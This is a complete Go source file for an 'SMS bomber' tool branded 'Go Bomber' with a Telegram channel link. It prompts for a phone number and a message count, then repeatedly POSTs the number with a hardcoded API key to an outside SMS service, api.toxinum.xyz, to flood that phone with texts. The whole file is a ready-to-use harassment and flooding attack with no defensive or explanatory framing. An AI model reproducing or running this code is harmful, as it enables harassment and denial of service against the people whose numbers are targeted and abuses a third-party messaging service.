package main

import (
    "bytes"
    "encoding/json"
    "fmt"
    "net/http"
    "strconv"
)

func main() {
    logo := `
  _____       ___             __
 / ___/__    / _ )___  __ _  / /  ___ ____
/ (_ / _ \  / _  / _ \/  ' \/ _ \/ -_) __/
\___/\___/ /____/\___/_/_/_/_.__/\__/_/ [@0xNaHiD]`
    fmt.Println(logo)
    fmt.Println("\033[34m---------------------------------------------------")
    fmt.Println("   \033[36mTelegram : \033[35mhttps://t.me/EHCommunityOfficial")
    fmt.Println("\033[34m---------------------------------------------------")
    var number string
    var count int
    fmt.Print("  \033[33mEnter your number: ")
    fmt.Scan(&number)
    fmt.Print("  \033[33mEnter the number of sms you want to send: ")
    fmt.Scan(&count)
    data := map[string]string{
        "number": number,
        "key": "duduBaba",
    }

    jsonValue, _ := json.Marshal(data)

    for i := 0; i < count; i++ {
        req, err := http.NewRequest("POST", "https://api.toxinum.xyz/v2/sms", bytes.NewBuffer(jsonValue))
        req.Header.Set("Content-Type", "application/json")

        client := &http.Client{}
        resp, err := client.Do(req)
        if err != nil {
            fmt.Println(err)
        }

        defer resp.Body.Close()
        fmt.Println("")
        fmt.Println(" \033[37m Sending", strconv.Itoa(i+1), "Sms To", number)
    }
}
